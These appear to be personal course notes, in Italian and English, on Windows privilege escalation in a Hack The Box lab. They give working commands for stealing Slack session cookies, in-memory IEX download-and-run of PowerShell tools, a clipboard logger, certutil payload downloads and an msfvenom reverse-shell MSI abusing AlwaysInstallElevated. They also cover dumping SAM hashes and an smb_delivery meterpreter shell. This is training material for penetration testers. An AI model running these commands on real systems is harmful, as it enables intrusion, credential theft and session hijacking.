`[!bash!]$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    `


## Abusing Cookied to get access to IM Clients
Applicazioni di IM(Instant Messaging) come Slack o Microsoft Teams sono diventate fisse negli uffici moderni.

Se l'utente sta usando qualche Multi-Facotr authentication o non riusciamo a prendere le credenziali in plaintext possiamo rubare i cookie per loggare nel cloud-based client.

Spesso ci sono tool per fare questo

### Cookie Extraction from Firefox
Firefox saves the cookies in an SQLite database in a file named cookies.sqlite. This file is in each user's APPDATA directory %APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release. There's a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.

### Copy Firefox Cookies Database
`PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .`

poi usiamo questo script (https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) per estrarre i cookie dal DB.

### Extract slack cookied from firefox COokie DB
`j4k1dibe@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d`

il cookie si chiama **d**

Dopo che abbiamo il cookie possiamo usare estensioni tipo **Cookie-editor** per modificare 

### Powershell script to Invoke-SharpChromium ed estrarre cookie da chromium based browsers

Anche in chromium i cookie stanno in un SQLite database ma il valore del cookie e' criptato con DPAPI )Data Protection API).
Per decriptare dovremmo fare una roba dalla sessione dell' utente cmpromesso. per fortuna c'e' **SharpChromium** che fa tutto.


```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
```

### Copy cookies to SharpChromium Expected Location
SharpChromium ha i path dei cookie hardcodati quindi se non corrisponde dovremmo mettere il cookie nel path che si aspetta.

`PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"`

### Invoke sharpchromium cookies extraction

`PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"`


## Clipboard

### Monitoring the clipboard with PowerShell
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
PS C:\htb> Invoke-ClipboardLogger
```

## Roles and Services.
tipici ruoli dei server sono:

- File and Print Servers
- Web and Database Servers
- Certificate Authority Servers
- Source Code Management Servers
- Backup Servers

### Attacking Backup servers

tipicamente i sistemi di backup hanno bisogno di un account per connettersi alla target machine e fare il backup.

Dovremmo cercare informazioni che ci aiutano a muovere lateralmente nella rete o escalare i privilegi.

Per esempio **Restic**.

### Restic, initialize backup directory

`PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init`

### Restic- backup a directory

```
PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder
```

### Resti-backup a directory with VSS

`PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot`

### Resti-check backups saved in a repository
`PS C:\htb> restic.exe -r E:\restic2\ snapshots`

### Restic- restore a backup with ID
`PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore`

# Miscellaneous Techniques

## Living Off The Land Binaries and Scripts (LOLBAS)

IL LOLBAS project (https://lolbas-project.github.io/) ha binari e script e librerie le **living off the land** 

Le funzionalita' che offrono questi binari sono
- Code execution
- Code compilation
- File transfers
- Persistence
- UAC bypass
- Credential theft
- Dumping process memory
- Keylogging
- Evasion
- DLL hijacking

### Esempio, usare certutil.exe per trasferire file

`PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat`

### Encode/decode file with Certutil.exe
`C:\htb> certutil -encode file1 encodedfile`

`C:\htb> certutil -decode encodedfile file2`

## Always Install Elevated

QUesto setting si puo' cambiare tramite la Local Group Policy settings settando **Enabled** sotto questi 2 path:

1) Computer Configuration\Administrative Templates\Windows Components\Windows Installer
2) User Configuration\Administrative Templates\Windows Components\Windows Installer

## Enumerating Always Install Elevated
`PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`

`PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

## Exploiting Always Install Elevated (create .msi package)
`j4k1dibe@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi`, creo il file .msi

`C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart` eseguo il file .msi

Questa shell dovrebbe essere proprio da NT AUTHORITY\SYSTEM

## CVE-2019-1388

 CHECKA SE C'E' questa vuln

## Scheduled Tasks

### Enumerating Scheduled Tasks
`C:\htb>  schtasks /query /fo LIST /v`

`PS C:\htb> Get-ScheduledTask | select TaskName,State`

## Writable folder
`C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\` se vediamo che abbiamo permessi di scrittura in una cartella cosi' e c'e' file dentro che viene eseguito periodicamente lo sostituiamo ezez.


## User/Computer Description Field

A volte potrebbe capitare (piu' comune in Active Directory) che un sysadmin stora dettagli di un account nella descrizione

`PS C:\htb> Get-LocalUser` ritorna Nome, Enabled e Description degli utenti.

### Enumeratng desription filed con un altro Cmdlet

`PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description`

## Mount VHDX/VMDK

Durante l' enumeration possiamo imbatterci in file interessanti sia localmente che in share. **Snaffler** (https://github.com/SnaffCon/Snaffler) puo' aiutarci in questa enumeration.

Ci sono alcuni file piu' interessanti di altri: **.vhd, .vhdx, .vmdk** che sono **Virtual Hard Disk** e **Virtual Machine Disk** file.

Da questi file possiamo probabilmente rubare hash, 

### Montarli localmente su linux
`j4k1dibe@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk`, montare un .vmdk

`j4k1dibe@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1` montare un .vhd o .vhdx

### Montarli localmente su Windows
Su windows si puo' usare **Disk Management** > actions > 

### Retrievare hash con secretsdump.py
`j4k1dibe@htb[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL`


# Windows Server

Windows server 2008/2008 R2 nel 14 gennaio 2020 sono arrivati all EOL.

Non e' piu' comune incontrare Win Server 2008 pero' negli assesment esterni ma negi assesment interi spesso si incontra.

## Windows server 2008 vs newer versions

| Feature                                | Server 2008 R2 | Server 2012 R2 | Server 2016 | Server 2019 |
|----------------------------------------|----------------|----------------|-------------|-------------|
| Enhanced Windows Defender Advanced Threat Protection (ATP) |                |                |             | X           |
| Just Enough Administration             | Partial        | Partial        | X           | X           |
| Credential Guard                       |                |                | X           | X           |
| Remote Credential Guard                |                |                | X           | X           |
| Device Guard (code integrity)          |                |                | X           | X           |
| AppLocker                               | Partial        | X              | X           | X           |
| Windows Defender                        | Partial        | Partial        | X           | X           |
| Control Flow Guard                      |                |                | X           | X           |


Spesso quando si ha a che fare con legacy system e' molto importante capirre se sono fondamentali per il cliente.

Su sistemi legacy come windows server 2008 possono usare script di enumerazione come **sherlock** https://github.com/rasta-mouse/Sherlock, o **Windows-Exploit-Suggester** (https://github.com/AonCyberLabs/Windows-Exploit-Suggester).


### Querying current Patch level
`C:\htb> wmic qfe`

## Running Sherlock
`PS C:\htb> Set-ExecutionPolicy bypass -Scope process`

```
PS C:\htb> Import-Module .\Sherlock.ps1
PS C:\htb> Find-AllVulns
```


## Prendere una meterpreter shell

1) usiamo exploit di metasploit **smb_delivery**
2) nella NOSTRA shell: `C:\htb> rundll32.exe \\10.10.14.3\lEUZam\test.dll`
3) Spesso per runnare moduli di privesc(tipo msf6 exploit(windows/smb/smb_delivery) > search 2010-3338) dobbiamo **MIGRARE AD UN PROCESSO A 64bite**
`
# Windows Desktop Versions

Windows 7 e' stato messo EOL il 14 gennaio 2020. ma si usa ancora molto

## WIndows 7 vs newer versions

| Feature                          | Windows 7 | Windows 10 |
|----------------------------------|-----------|------------|
| Microsoft Password (MFA)         |           | X          |
| BitLocker                        | Partial   | X          |
| Credential Guard                 |           | X          |
| Remote Credential Guard          |           | X          |
| Device Guard (code integrity)    |           | X          |
| AppLocker                        | Partial   | X          |
| Windows Defender                 | Partial   | X          |
| Control Flow Guard               |           | X          |

Si stima che ancora 100 milioni di utenti stanno usando Windows7.

Su windows7 possiamo usare ancora **Sherlock** e **Windows-Exploit-Suggester**.


## Windows-Exploit-Suggester
1) Sulla macchina target runniamo `C:\htb> systeminfo`
2) sulla nostra macchina `j4k1dibe@htb[/htb]$ python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt ` 
